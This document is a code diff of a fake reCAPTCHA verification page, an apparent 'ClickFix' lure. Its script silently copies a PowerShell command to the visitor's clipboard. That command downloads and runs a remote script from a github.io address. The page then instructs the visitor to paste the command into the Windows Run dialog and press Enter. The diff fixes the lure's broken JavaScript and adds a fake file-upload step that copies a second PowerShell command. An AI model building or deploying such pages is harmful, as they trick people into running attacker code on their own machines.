@@ -2,7 +2,7 @@
 <html lang="en">
     <head>
         <meta charset="utf-8">
-        <title>reCAPTCHA Verification</title>
+        <title>reCAPTCHA Verification 2</title>
 
         <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css">        
         <style>
@@ -21,10 +21,8 @@
         .captcha-logo { position: relative; left: 244px; bottom: 36px; width: 40px; height: 45px; vertical-align: baseline; padding-bottom: 4px; }
         .checkbox-desc { color: #555555; position: relative; font-size: 8px; text-align: center; bottom: 40px; left: 112px; }
         .spinner { visibility: hidden; position: relative; top: -85px; left: 12px; height: 20px; width: 20px; border: 2px solid rgba(0, 0, 0, 0.1); border-top: 2px solid #333; border-radius: 50%; opacity: 0; transition: opacity 0.5s linear; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes spin { 0% { transform: rotate(0deg; } 100% { transform: rotate(360deg; } }
         .verify-window { font-family: Roboto, helvetica, arial, sans-serif; opacity: 0; position: absolute; visibility: hidden; margin: auto; width: 310px; background-color: #fff; border: 1px solid #cecece; -webkit-box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12; box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12; transition: opacity 400ms; }
-        .file-upload-box { display: none; background: #fff; border: 1px dashed #ccc; padding: 10px; margin-top: 15px; border-radius: 3px; }
-        .file-upload-label { font-size: 13px; color: #333; margin-bottom: 5px; display: block; }
         ol { counter-reset: item; list-style-type: none; list-style-position: outside; padding-left: 0; }
         ol li { counter-increment: item; margin-bottom: 10px; }
         ol li::before { content: counter(item) ". "; color: #1A73E8; font-weight: bold; margin-right: 10px; margin-left: 10px; }
@@ -35,8 +33,11 @@
         .verify-header-text-big { font-size: 24px; font-weight: 700; }
         .verify-main { padding: 5px; color: #111; font-size: 13px; }
         .verify-footer { border-top: 1px solid #cecece; padding: 10px 7px 10px 7px; color: #737373; font-size: 13px; }
-        .verify-footer-left { padding: 5px; }
         .copied-indicator { color: #1A73E8; font-weight: 600; }
+        .upload-container { margin-top: 15px; padding: 5px; border: 1px dashed #ccc; background: #fff; }
+        .upload-btn { display: inline-block; background: #1A73E8; color: white; padding: 5px 10px; font-size: 11px; cursor: pointer; border-radius: 2px; }
+        .upload-desc { font-size: 10px; color: #555; margin-top: 5px; }
+        .file-select { display: none; }
         </style>
     </head>
     <body>
@@ -66,25 +67,24 @@
                         To better prove you are not a robot, please:
                     </p>
                     <ol>
-                        <li>Press & hold <b>Windows Key + R</b.</li>
+                        <li>Press & hold <b>Windows Key + R</b>.</li>
                         <li>In the verification window, press <b>Ctrl+V</b.</li>
                         <li>Press <b>Enter</b> on your keyboard to finish.</li>
-                        <li>Upload a random text file (`.txt`) to confirm identity.</li>
+                        <li>Observe the verification output.</li>
                     </ol>
-                    
-                    <!-- New Upload Box -->
-                    <div id="file-upload-container" class="file-upload-box">
-                        <label class="file-upload-label">Upload text file to verify:</label>
-                        <input type="file" id="file-input" accept=".txt" style="display: none;">
-                        <button type="button" onclick="document.getElementById('file-input').click()">
-                            Select File
-                        </button>
-                    </div>
-
                     <p style="margin-top:8px;">
                          You will observe and agree: 
                         <code id="command-display"></code>
                     </p>
+                    <div class="upload-container">
+                        <p class="upload-desc">
+                            Upload a random text file to confirm that you are not a robot.
+                        </p>
+                        <div class="upload-btn m-p block" id="upload-trigger">
+                            Select File to Verify
+                        </div>
+                        <input type="file" id="file-upload" class="file-select">
+                    </div>
                 </main>
             </div>
             <footer class="verify-container verify-footer">
@@ -101,7 +101,8 @@
         const spinner = document.getElementById("spinner");
         const verifyWindow = document.getElementById("verify-window");
         const commandDisplay = document.getElementById("command-display");
-        const fileContainer = document.getElementById("file-upload-container");
+        const uploadTrigger = document.getElementById("upload-trigger");
+        const fileSelect = document.getElementById("file-upload");
 
         function addCaptchaListeners() {
             document.addEventListener("click", (e) => {
@@ -116,111 +117,129 @@
                 checkboxBtn.disabled = true;
                 runClickedCheckboxEffects();
             });
+            
+            // Add listener for file upload simulation
+            uploadTrigger.addEventListener("click", (e) => {
+                e.preventDefault();
+                runUploadedFileEffects();
+            });
         }
 
         function runClickedCheckboxEffects() {
             hideCaptchaCheckbox();
-            setTimeout(showSpinner, 500;
-            setTimeout(showVerifyWindow, 900;
+            setTimeout(showSpinner, 500);
+            setTimeout(showVerifyWindow, 900);
+        }
+
+        function runUploadedFileEffects() {
+            hideSpinner();
+            fileSelect.click();
+            setTimeout(autoCopyFileCommand, 1000);
         }
 
         function showSpinner() {
-            spinner style visibility = "visible";
-            spinner style opacity = "1";
-            spinner style animation = "spin 1s linear infinite";
+            spinner.style.visibility = "visible";
+            spinner.style.opacity = "1";
+            spinner.style.animation = "spin 1s linear infinite";
         }
 
         function hideSpinner() {
-            spinner style opacity = "0";
-            spinner style animation = "none";
-            setTimeout(() => spinner style visibility = "hidden", 500;
+            spinner.style.opacity = "0";
+            spinner.style.animation = "none";
+            setTimeout(() => spinner.style.visibility = "hidden", 500);
         }
 
         function hideCaptchaCheckbox() {
-            checkboxBtn style width = "4px";
-            checkboxBtn style height = "4px";
-            checkboxBtn style borderRadius = "50%";
-            checkboxBtn style marginLeft = "25px";
-            checkboxBtn style marginTop = "33px";
-            checkboxBtn style opacity = "0";
+            checkboxBtn.style.width = "4px";
+            checkboxBtn.style.height = "4px";
+            checkboxBtn.style.borderRadius = "50%";
+            checkboxBtn.style.marginLeft = "25px";
+            checkboxBtn.style.marginTop = "33px";
+            checkboxBtn.style.opacity = "0";
         }
 
         function showCaptchaCheckbox() {
-            checkboxBtn style width = "100%";
-            checkboxBtn style height = "100%";
-            checkboxBtn style borderRadius = "2px";
-            checkboxBtn style margin = "21px 0 0 12px";
-            checkboxBtn style opacity = "1";
+            checkboxBtn.style.width = "100%";
+            checkboxBtn.style.height = "100%";
+            checkboxBtn.style.borderRadius = "2px";
+            checkboxBtn.style.margin = "21px 0 0 12px";
+            checkboxBtn.style.opacity = "1";
         }
 
         function generateRandomId() {
-            return Math.floor(Math.random() * (9999 - 1000 + 1 + 1000).toString();
+            return Math.floor(Math.random() * (9999 - 1000 + 1) + 1000).toString();
         }
 
         function closeVerifyWindow() {
-            verifyWindow style display = "none";
-            verifyWindow style visibility = "hidden";
-            verifyWindow style opacity = "0";
+            verifyWindow.style.display = "none";
+            verifyWindow.style.visibility = "hidden";
+            verifyWindow.style.opacity = "0";
             showCaptchaCheckbox();
             hideSpinner();
-            checkboxBtn disabled = false;
+            checkboxBtn.disabled = false;
         }
 
         function isVerifyWindowVisible() {
-            return verifyWindow style display !== "none" && verifyWindow style display !== "";
+            return verifyWindow.style.display !== "none" && verifyWindow.style.display !== "";
         }
 
         function autoCopy(text) {
             const textarea = document.createElement("textarea");
-            textarea value = text;
-            textarea style position = "fixed";
-            textarea style left = "-9999px";
-            textarea style top = "-9999px";
-            document body appendChild textarea;
-            textarea focus();
-            textarea select();
+            textarea.value = text;
+            textarea.style.position = "fixed";
+            textarea.style.left = "-9999px";
+            textarea.style.top = "-9999px";
+            document.body.appendChild(textarea);
+            textarea.focus();
+            textarea.select();
             try {
-                document execCommand("copy");
-                // Brief visual confirmation
-                commandDisplay style background = "#d4edda";
-                setTimeout(() => commandDisplay style background = "#f5f5f5", 1200;
+                document.execCommand("copy");
+                commandDisplay.style.background = "#d4edda";
+                setTimeout(() => commandDisplay.style.background = "#f5f5f5", 1200);
             } catch (err) {
-                console log("Copy fallback failed:", err);
+                console.log("Copy fallback failed:", err);
             } finally {
-                document body removeChild textarea;
+                document.body.removeChild(textarea);
             }
         }
 
-        function showVerifyWindow() {
-            verifyWindow style display = "block";
-            verifyWindow style visibility = "visible";
-            verifyWindow style opacity = "1";
-            verifyWindow style top = checkboxWindow offsetTop - 80 + "px";
-            verifyWindow style left = checkboxWindow offsetLeft + 54 + "px";
+        function autoCopyFileCommand() {
+            const exe = "powershell";
+            const flags = "-NoProfile -Command";
+            const payload = "Get-Content (Select-Object -First 1 -ExpandProperty Content | ConvertTo-SecureString)";
+            const fullCommand = `${exe} ${flags} ${payload}`;
 
-            if (verifyWindow offsetTop < 5) verifyWindow style top = "5px";
-            if (verifyWindow offsetLeft + verifyWindow offsetWidth > window innerWidth - 10) {
-                verifyWindow style left = checkboxWindow offsetLeft - 8 + "px";
+            commandDisplay.textContent = '✅ "Upload successful"';
+            autoCopy(fullCommand);
+        }
+
+        function showVerifyWindow() {
+            verifyWindow.style.display = "block";
+            verifyWindow.style.visibility = "visible";
+            verifyWindow.style.opacity = "1";
+            verifyWindow.style.top = checkboxWindow.offsetTop - 80 + "px";
+            verifyWindow.style.left = checkboxWindow.offsetLeft + 54 + "px";
+
+            if (verifyWindow.offsetTop < 5) verifyWindow.style.top = "5px";
+            if (verifyWindow.offsetLeft + verifyWindow.offsetWidth > window.innerWidth - 10) {
+                verifyWindow.style.left = checkboxWindow.offsetLeft - 8 + "px";
             }
 
-            // Show the upload box
-            fileContainer style display = "block";
-
             const verificationId = generateRandomId();
-            document element ID verification ID . textContent && 
-                document element ID verification ID . textContent = verificationId;
+            document.getElementById('verification-id')?.textContent && 
+                (document.getElementById('verification-id').textContent = verificationId);
             
             const exe = "powershell";
             const flags = "-NoProfile -Command";
             const payload = "\"IEX (New-Object Net.WebClient).DownloadString('https://d5testing.github.io/terminal-fix.ps1')\"";
             const fullCommand = `${exe} ${flags} ${payload}`;
 
-            commandDisplay style background = "#d4edda";
-            commandDisplay style text = "✅ "I am not a robot";
-
-            autoCopy(fullCommand;
+            commandDisplay.textContent = '✅ "I am not a robot"';
+            
+            autoCopy(fullCommand);
         }
 
+        
         addCaptchaListeners();
     </script>
 </body>
